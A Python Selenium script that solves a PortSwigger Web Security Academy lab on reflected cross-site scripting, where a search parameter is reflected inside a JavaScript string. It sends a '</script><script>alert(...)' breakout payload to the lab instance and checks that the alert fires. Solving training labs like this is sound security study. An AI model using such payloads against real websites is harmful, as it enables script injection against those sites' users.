# ===================================================================================================================================
# Script for solving the lab "Reflected XSS into a JavaScript string with single quote and backslash escaped"
# of the portswigger.net web security academy.
# Link to the lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
# ===================================================================================================================================

from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import urllib.parse
import typer

TO_REFLECT = 'ALL-YOUR-BASE-ARE-BELONG-TO-US'
QUERY = '?search=' + urllib.parse.quote('</script><script>alert("' + TO_REFLECT + '")</script><script>', safe='')

def search(sid):
    service = ChromeService(executable_path=ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service)
    #driver.maximize_window()
    driver.get('https://' + sid + '.web-security-academy.net/' + QUERY)
    try:
        WebDriverWait(driver, 5).until (EC.alert_is_present())
        alert = driver.switch_to.alert
        text = alert.text
        alert.accept()
        print("Alert exists in page. Text:")
        print(text)
        if (text == TO_REFLECT):
            print("Which is the expected output")
        else:
            print("Unexpected output!")
        driver.close()
    except TimeoutException:
        print("Alert does not exist in page")
        driver.close()

def main(sid:str):
    print('Commencing attack on lab')
    print('"Reflected XSS into a JavaScript string with single quote and backslash escaped"')
    search(sid)

if __name__ == "__main__":
    typer.run(main)
